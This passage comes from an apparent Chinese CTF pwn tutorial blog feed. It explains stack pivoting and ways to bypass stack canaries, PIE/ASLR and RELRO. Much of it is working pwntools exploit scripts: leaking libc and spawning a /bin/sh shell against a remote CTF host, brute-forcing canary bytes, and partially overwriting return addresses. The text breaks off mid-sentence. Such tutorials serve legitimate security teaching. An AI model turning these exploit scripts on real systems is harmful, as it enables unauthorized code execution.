eip，程序跳转）</p></li></ul><p><img data-src="D:\ctf\s0m1ng\source\images\PWN\attack\stack\栈迁移\leave_ret1.png" alt="leave_ret1"></p><h3 id="第一次-leave-ret：修改-ebp-和-eip"><a href="#第一次-leave-ret：修改-ebp-和-eip" class="headerlink" title="第一次 leave; ret：修改 ebp 和 eip"></a>第一次 <code>leave; ret</code>：修改 ebp 和 eip</h3><p>假设我们在 <code>main</code> 函数里，利用微小的溢出，把栈上的 <code>ebp</code> 覆盖成了<strong>目标迁移地址（Target_Addr）</strong>，把 <code>返回地址</code> 覆盖成了程序代码段里某处 <strong><code>leave; ret</code> 指令的地址 (Gadget)</strong>。</p><ol><li><p><code>mov esp, ebp</code>：正常执行，esp 回到当前函数的 ebp 位置。</p></li><li><p><code>pop ebp</code>：<strong>异常出现：</strong> 此时弹给 <code>ebp</code> 的不再是原来的旧 ebp，而是我们伪造的 <strong>Target_Addr</strong>。</p></li><li><p><code>ret (pop eip)</code>：<strong>控制流被劫持：</strong> eip 没有回到上一层函数，而是跳到了我们布置的 <strong><code>leave; ret</code> Gadget</strong> 去执行。</p></li></ol><p><img data-src="D:\ctf\s0m1ng\source\images\PWN\attack\stack\栈迁移\leave_ret2.png" alt="leave_ret2"></p><h4 id="第二次-leave-ret：完成迁移"><a href="#第二次-leave-ret：完成迁移" class="headerlink" title="第二次 leave; ret：完成迁移"></a>第二次 <code>leave; ret</code>：完成迁移</h4><p>此时 CPU 到了 Gadget 处，开始执行第二次 <code>leave; ret</code>：</p><ol><li><p><code>mov esp, ebp</code>：前面说到 <code>ebp</code> 里现在装着的是 <strong>Target_Addr</strong>。这条指令直接把 <code>esp</code> 也扯到了 Target_Addr。<strong>至此，栈被成功搬家</strong></p></li><li><p><code>pop ebp</code>：把新栈（Target_Addr）最顶端的数据弹给 <code>ebp</code>（通常可以填些无意义的 padding，如 <code>aaaa</code>）。</p></li><li><p><code>ret (pop eip)</code>：将新栈上的第二个数据弹给 <code>eip</code>。此时 <code>eip</code> 里装入的就是我们提前布置好的 ROP 链起点（比如 <code>system</code> 的地址）</p></li></ol><blockquote><p><strong>实战经验谈：迁移去哪里？</strong></p><ul><li><p><strong>当栈不可执行且没有开启 PIE</strong>：通常迁移到 <code>.bss</code> 段。我们在第一阶段向 <code>.bss</code> 段写入巨长的 ROP 链，第二阶段把栈迁移过去执行。</p></li><li><p><strong>当已知某处栈地址</strong>：也可以把栈往回迁（重新迁回 <code>main</code> 栈或其他已知 Buffer），榨干所有的输入空间。</p></li></ul></blockquote><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>下面是一道经典的 64 位栈迁移例题。题目特点：溢出空间极小，但自带 <code>puts</code> 泄露了输入缓冲区的地址 <code>buf_adr</code>。</p><p>我们利用这极其有限的空间，将栈迁移回 <code>buf_adr</code> 所在的已知位置，分两步走：</p><ol><li><p>第一步：构造 Payload，泄露 Libc 基址，然后返回到 <code>main</code> 函数重置状态。</p></li><li><p>第二步：再次利用迁移，调用 <code>system(&quot;/bin/sh&quot;)</code>。</p></li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * p = remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>, <span class="number">20630</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 接收程序主动泄露的 buf_adr</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;mick0960.\n&#x27;</span>)  </span><br><span class="line">buf_adr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 各种 Gadget 与函数地址</span></span><br><span class="line">adr_leave = <span class="number">0x4012F2</span>   <span class="comment"># 核心：leave; ret 指令的地址</span></span><br><span class="line">adr_sercet = <span class="number">0x4011DD</span>  <span class="comment"># 题目中的某个输出/泄露函数</span></span><br><span class="line">adr_main = <span class="number">0x40124a</span>    <span class="comment"># 注意：回到 main 函数时要注意跳过 push rbp，否则会破坏我们好不容易布置的栈环境！</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ================= 第一轮 Payload (泄露 libc) =================</span></span><br><span class="line"><span class="comment"># 栈迁移的 Payload 构造法则：[预先布置的 ROP 链] + [Padding 填满] + [伪造的 RBP] + [leave_ret_gadget]</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(adr_sercet) + p64(<span class="number">0</span>) + p64(adr_main)  <span class="comment"># 这是迁移后将要执行的 ROP 链</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span>  <span class="comment"># Padding 填充，凑够溢出偏移</span></span><br><span class="line">payload += p64(buf_adr) + p64(adr_leave)  <span class="comment"># [劫持 RBP 指向 buf] + [劫持 RET 执行第二次 leave;ret]</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收泄露的地址并计算基址</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">adr_put = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc_base = adr_put - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================= 第二轮 Payload (GetShell) =================</span></span><br><span class="line"><span class="comment"># 程序跳回了 main，我们再次接收新的 buf_adr</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;mick0960.\n&#x27;</span>)</span><br><span class="line">buf_adr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 system 和 /bin/sh 的真实地址</span></span><br><span class="line">adr_sys = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">adr_bin = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找一个 pop rdi; ret 给 system 传参</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span>       </span><br><span class="line">ret = <span class="number">0x000000000040101a</span> <span class="comment"># 栈对齐（我们在 64 位下调用 system 的优良习惯）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次构造栈迁移 Payload 拿 Shell</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi) + p64(adr_bin) + p64(adr_sys) <span class="comment"># 迁移后的 ROP 链</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># Padding</span></span><br><span class="line">payload += p64(buf_adr) + p64(adr_leave)  <span class="comment"># 再次劫持 RBP 和 RET，进行栈迁移</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>需要注意：</strong></p><ol><li><p><strong>栈对齐问题</strong>：在 64 位 Ubuntu 系统中，如果打不通，就在调用 <code>system</code> 前试试加上一个单 <code>ret</code> 指令，保证 16 字节栈平衡，否则 <code>movaps</code> 指令会直接让你 Segmentation Fault 崩溃</p></li><li><p><strong>跳回 Main 的位置</strong>：如果在 ROP 链里跳回 <code>main</code> 函数，尽量跳过 <code>main</code> 汇编开头的那句 <code>push rbp</code>（比如直接跳到 <code>rsp - 0x30</code> 分配空间的那句），以免新的一轮执行把我们辛辛苦苦迁移的栈结构又给破坏了。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;目录：&quot;&gt;&lt;a href=&quot;#目录：&quot; class=&quot;headerlink&quot; title=&quot;目录：&quot;&gt;&lt;/a&gt;目录：&lt;/h1&gt;&lt;p&gt;进阶技巧里包括&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;[x] &lt;strong&gt;栈迁移 (Stack Pivoting)&lt;/strong&gt;&lt;</summary>
      
    
    
    
    <category term="PWN" scheme="http://example.com/categories/PWN/"/>
    
    <category term="PWN_ATTACK" scheme="http://example.com/categories/PWN/PWN-ATTACK/"/>
    
    <category term="stack_overflow" scheme="http://example.com/categories/PWN/PWN-ATTACK/stack-overflow/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="栈溢出" scheme="http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="栈迁移" scheme="http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    
    <category term="ROP" scheme="http://example.com/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出攻击：安全保护机制与绕过策略</title>
    <link href="http://example.com/2026/03/13/PWN/pwn_attack/stack_overflow/%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5/"/>
    <id>http://example.com/2026/03/13/PWN/pwn_attack/stack_overflow/%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5/</id>
    <published>2026-03-13T02:00:00.000Z</published>
    <updated>2026-03-13T12:26:18.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>在现代操作系统中，单纯的栈溢出已经很难直接奏效。编译器和系统引入了多种保护机制，其中最与栈溢出相关的就是 <strong>Canary</strong> 和 <strong>PIE/ASLR</strong></p><p>对于一个elf文件我们可以 checksec 来查看它用了什么保护</p><h1 id="Canary-金丝雀-保护绕过"><a href="#Canary-金丝雀-保护绕过" class="headerlink" title="Canary (金丝雀) 保护绕过"></a>Canary (金丝雀) 保护绕过</h1><p>Canary 是一种专门针对连续覆盖类型栈溢出的保护机制。它会在函数的 <code>rbp/ebp</code> 之前插入一个随机生成的加密数值（金丝雀）。在函数执行完毕准备 <code>ret</code> 返回前，程序会检查这个值是否被篡改。如果被破坏，通常会输出 <code>*** stack smashing detected ***</code> 并强制终止程序。</p><p>canary位置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">       高地址 (栈底)</span><br><span class="line">+-------------------------+</span><br><span class="line">|   (前一个函数的栈帧)     |</span><br><span class="line">+-------------------------+</span><br><span class="line">|   返回地址 (RET Address)| </span><br><span class="line">+-------------------------+</span><br><span class="line">|   保存的 RBP / EBP      | </span><br><span class="line">+-------------------------+</span><br><span class="line">|  Canary (金丝雀)        | </span><br><span class="line">+-------------------------+</span><br><span class="line">|                         | </span><br><span class="line">|   局部变量 (Buffer)     |</span><br><span class="line">|                         |</span><br><span class="line">+-------------------------+</span><br><span class="line">       低地址 (栈顶)</span><br></pre></td></tr></table></figure><p>Canary 的设计有一个非常关键的特征：<strong>它的最低位（第一个字节）永远是 <code>\x00</code></strong>。这是为了防止 <code>puts</code>、<code>printf</code> 等字符串输出函数不小心把它打印出来（因为这些函数遇到 <code>\x00</code> 就会当作字符串结尾停止输出）。</p><h2 id="绕过手法一：覆盖最低位泄露-Leak"><a href="#绕过手法一：覆盖最低位泄露-Leak" class="headerlink" title="绕过手法一：覆盖最低位泄露 (Leak)"></a>绕过手法一：覆盖最低位泄露 (Leak)</h2><p>既然输出函数(如puts，printf，fprintf)遇到 <code>\x00</code> 就停，那我们就利用溢出，<strong>精准填满缓冲区，并把 Canary 最低位的 <code>\x00</code> 覆盖掉（比如用字符 ‘a’）</strong>。这样一来，字符串就没有了结束符，输出函数就会顺藤摸瓜，连带着把剩下的 7 个字节的 Canary 全部打印出来！</p><p><strong>核心 Payload 逻辑：</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设缓冲区距离 Canary 的偏移是 0x70-8</span></span><br><span class="line"><span class="comment"># 故意多填 1 字节，覆盖掉 Canary 最低位的 \x00</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">8</span> + <span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：必须用 send，不能用 sendline，防止附加的 \n 干扰泄露</span></span><br><span class="line">io.send(payload) </span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span>)</span><br><span class="line"><span class="comment"># 接收后，减去我们覆盖上去的 &#x27;a&#x27; (0x61)，还原出真实的 Canary</span></span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x61</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拿到 Canary 后，正常构造 ROP 链进行溢出</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x40101a</span>) + p64(back)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><h2 id="绕过手法二：逐字节爆破-Brute-force"><a href="#绕过手法二：逐字节爆破-Brute-force" class="headerlink" title="绕过手法二：逐字节爆破 (Brute-force)"></a>绕过手法二：逐字节爆破 (Brute-force)</h2><p>这种手法通常用于使用了 <code>fork()</code> 处理并发的网络服务进程。 <strong>核心原理：</strong> Canary 在主进程启动时确定，只生成一次。子进程通过 <code>fork()</code> 拷贝父进程时，<strong>Canary 的值是完全一样的</strong>。如果子进程崩溃（检测到 smashing），父进程依然存活并能派生新的子进程，这为我们提供了无限次尝试的机会。</p><p><strong>爆破逻辑：</strong></p><ol><li><p>已知最低位是 <code>\x00</code>。</p></li><li><p>从次低位开始，每次只覆盖一个字节，从 <code>0x00</code> 尝试到 <code>0xff</code> (共 256 次)。</p></li><li><p>如果程序返回了 <code>smashing</code> 报错，说明猜错了；如果没有报错，说明猜对了当前字节。固定该字节，继续爆破下一个字节。</p></li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#canary 检测到一般会输出*** stack smashing detected *** 是固定的提示。所以可以通过爆破来获取canary</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#canary 在进程启动时确定，只生成一次。即使fork()也就是把父进程拷贝给子进程，也是一样的canary</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        num = libc.rand() % <span class="number">50</span></span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;BaseCTF&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">        p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + p8(a)</span><br><span class="line">        r.send(p)</span><br><span class="line"></span><br><span class="line">        r.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        rec = r.readline()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;smashing&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> rec:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;No.<span class="subst">&#123;i + <span class="number">1</span>&#125;</span> byte is <span class="subst">&#123;<span class="built_in">hex</span>(a)&#125;</span>&quot;</span>)</span><br><span class="line">            canary += p8(a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary is <span class="subst">&#123;<span class="built_in">hex</span>(u64(canary))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x02B1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        num = libc.rand() % <span class="number">50</span></span><br><span class="line">        r.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">        p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span> + p16(shell)</span><br><span class="line">        r.send(p)</span><br><span class="line">        rec = r.readline()</span><br><span class="line">        <span class="built_in">print</span>(rec)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;welcome&#x27;</span> <span class="keyword">in</span> rec:</span><br><span class="line">            r.readline()</span><br><span class="line">            shell += <span class="number">0x1000</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="PIE-ASLR-地址随机化"><a href="#PIE-ASLR-地址随机化" class="headerlink" title="PIE / ASLR (地址随机化)"></a>PIE / ASLR (地址随机化)</h1><p>PIE（Position-Independent Executable）使得程序每次加载的基地址都不同，配合系统的 ASLR（地址空间布局随机化），让硬编码地址的 ROP 链全部失效。</p><p><strong>核心破局点：页对齐原理 (Page Alignment)</strong></p><p>无论是主程序还是 <code>libc.so</code>，加载到内存时都必须<strong>严格遵循页对齐</strong>。在 Linux 中，页的大小通常是 <code>4KB</code> (即 <code>0x1000</code> 字节)。</p><p><strong>绝对铁律：</strong> 加载基址的低 12 位（二进制最低 12 bit，即十六进制的最后三位数）始终为 <code>0</code>。</p><p>这意味着，<strong>一个地址的低 12 位（即页内偏移）是永远固定的，无论 ASLR 怎么变，它都不会参与随机化</strong></p><p>对于64位Linux：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[ 47 .................. 12 ]</span><span class="section">[ 11 .......... 0 ]</span></span><br><span class="line"> ↑                         ↑</span><br><span class="line"> |                         |</span><br><span class="line"> |                         └── 页内偏移（Page Offset，12 位 = 4KB）</span><br><span class="line"> |</span><br><span class="line"> └── 页号（Page Number）</span><br></pre></td></tr></table></figure><p>bit[0..11] (低 12 位)：页内偏移，永远是固定的（页大小 4KB）。</p><p>bit[12..47]：页号，会随着 ASLR 随机化。</p><p>bit[48..63]：在 Linux 下一般是符号扩展（因为有效地址只有 48 位）。</p><p>对于32位Linux：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[ 31 .................. 12 ]</span><span class="section">[ 11 .......... 0 ]</span></span><br><span class="line"> ↑                         ↑</span><br><span class="line"> |                         └── 页内偏移 (Page Offset, 12 bit)</span><br><span class="line"> └── 页号 (Page Number, 20 bit)</span><br></pre></td></tr></table></figure><p>bit[0..11] → 页内偏移，固定。</p><p>bit[12..31] → 页号，会被 ASLR 随机化。</p><h2 id="绕过手法一：部分覆盖-Partial-Write"><a href="#绕过手法一：部分覆盖-Partial-Write" class="headerlink" title="绕过手法一：部分覆盖 (Partial Write)"></a>绕过手法一：部分覆盖 (Partial Write)</h2><p>当我们没有任何漏洞可以泄露地址时，可以利用“页内偏移固定”的特性。我们不覆盖整个 8 字节的返回地址(64位linux)，而是<strong>只覆盖返回地址的最末尾 1 到 2 个字节</strong>。</p><ul><li><p>如果只覆盖最低 1 字节（8 bits），必定 100% 成功，因为低 12 位是绝对不变的。</p></li><li><p>如果覆盖最低 2 字节（16 bits），会有 4 个 bit (16 - 12 = 4) 受到 ASLR 的影响，成功率通常是 $1/2^4 = 1/16$，可以结合脚本循环爆破。</p></li></ul><p>只要你的目标函数（比如后门 <code>get_shell</code>）和栈上原本要返回的函数<strong>在同一个代码页内</strong>（相对距离非常近，只有末尾 1~2 个字节不同），你就可以用这种手法，把 ASLR 变成摆设</p><p><strong>实战示例 (单字节稳定篡改)：</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原本的返回地址可能是 0x55xxxxxx1234，目标指令地址在 0x55xxxxxx1289 </span></span><br><span class="line"><span class="comment"># 只覆盖最低一个字节，即可精确跳转到同一内存页面的其他指令 </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x108</span> + <span class="string">b&#x27;\x89&#x27;</span> </span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h2 id="绕过手法二：泄露并计算基址"><a href="#绕过手法二：泄露并计算基址" class="headerlink" title="绕过手法二：泄露并计算基址"></a>绕过手法二：泄露并计算基址</h2><p>最常规、最稳妥的打法：利用输出函数（如 <code>puts</code>、<code>write</code>）打印出内存中某个已知的绝对地址，然后减去其固定偏移，逆向算出内存加载基址。</p><p><strong>细节避坑：</strong> 在发送 padding 准备泄露地址时，<strong>务必使用 <code>send()</code> 而不是 <code>sendline()</code></strong>。因为 <code>sendline()</code> 会在末尾追加一个换行符 <code>\n</code> (<code>0x0a</code>)，这会污染目标地址的最末位，导致泄露失败。</p><p><strong>例题：basectf 2024 pie</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20678</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./vuln&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">paylaod=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+<span class="string">b&#x27;\x89&#x27;</span></span><br><span class="line">p.send(paylaod)  <span class="comment">#这里一定用send，因为sendline会污染接受的地址</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">adr_libc_main=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=adr_libc_main-<span class="number">0x29D89</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">adr_sys=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">adr_binsh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">adr_pop_rdi=<span class="number">0x2a3e5</span>+libc_base</span><br><span class="line">adr_ret=<span class="number">0x29139</span>+libc_base</span><br><span class="line"></span><br><span class="line">paylaod=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(adr_ret)+p64(adr_pop_rdi)+p64(adr_binsh)+p64(adr_sys)    <span class="comment">#出错就检查栈是否对齐</span></span><br><span class="line"></span><br><span class="line">p.sendline(paylaod)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="RELRO-重定位只读-的应对策略"><a href="#RELRO-重定位只读-的应对策略" class="headerlink" title="RELRO (重定位只读) 的应对策略"></a>RELRO (重定位只读) 的应对策略</h1><p>在没有 RELRO 或者只有 Partial RELRO 的时代，由于延迟绑定机制的存在，GOT 表（<code>.got.plt</code> 段）必须是<strong>可读可写 (<code>rw-</code>)</strong> 的。黑客最喜欢的打法就是<strong>GOT 表劫持</strong>：利用任意地址写漏洞，把 <code>elf.got[&#39;puts&#39;]</code> 里的地址改成 <code>system</code> 的地址。下次程序再调用 <code>puts(&quot;/bin/sh&quot;)</code> 时，实际上执行的就是 <code>system(&quot;/bin/sh&quot;)</code>。</p><p>为了封杀这种极其好用的打法，<strong>RELRO (Relocation Read-Only)</strong> 保护应运而生。</p><h2 id="保护级别的差异：Partial-vs-Full"><a href="#保护级别的差异：Partial-vs-Full" class="headerlink" title="保护级别的差异：Partial vs Full"></a>保护级别的差异：Partial vs Full</h2><p>使用 <code>checksec</code> 命令时，你会看到 RELRO 有两种状态：</p><h3 id="1-Partial-RELRO-部分保护"><a href="#1-Partial-RELRO-部分保护" class="headerlink" title="1. Partial RELRO (部分保护)"></a>1. Partial RELRO (部分保护)</h3><ul><li><p><strong>现状：</strong> 仅仅把 <code>.dynamic</code> 等一些内部段设为只读。但最重要的 <code>.got.plt</code>（也就是我们常说的 GOT 表）<strong>依然是可写的</strong>！</p></li><li><p><strong>应对策略：</strong> 毫无影响。该怎么劫持 GOT 表就怎么劫持，直接把 GOT 表项的地址当作你的写入目标即可。</p></li></ul><h3 id="2-Full-RELRO-完全保护"><a href="#2-Full-RELRO-完全保护" class="headerlink" title="2. Full RELRO (完全保护)"></a>2. Full RELRO (完全保护)</h3><ul><li><p><strong>现状：</strong> 程序在启动的瞬间，动态链接器会强制把所有外部函数的真实地址全部查出来并填好（放弃了延迟绑定带来的启动速度优势）。填完之后，<strong>立刻把整个 GOT 